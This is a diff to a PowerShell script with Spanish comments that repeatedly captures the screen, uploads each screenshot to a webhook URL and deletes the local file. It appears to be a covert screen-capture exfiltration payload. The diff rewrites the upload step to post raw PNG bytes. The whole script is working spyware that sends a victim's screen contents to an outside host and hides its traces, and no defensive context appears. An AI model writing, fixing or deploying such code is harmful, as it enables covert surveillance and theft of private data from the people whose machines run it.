@@ -3,7 +3,7 @@ $seconds = 30 # Intervalo entre capturas
 
 # Detección de URL acortada
 if ($hookurl.Length -le 121) {
-    Write-Host "Shortened Webhook URL Detected..00."
+    Write-Host "Shortened Webhook URL Detected..0."
     $hookurl = (Invoke-RestMethod -Uri $hookurl).url
 }
 
@@ -28,7 +28,10 @@ do {
     $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
     $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
     Start-Sleep 1
-    Invoke-WebRequest -Uri $hookurl -Method POST -InFile $Filett
+    
+    $fileContent = Get-Content -Path $Filett -Encoding Byte -ReadCount 0
+    Invoke-WebRequest -Uri $hookurl -Method POST -ContentType "image/png" -Body $fileContent
+
     Start-Sleep 1
     Remove-Item -Path $Filett
     Start-Sleep $seconds
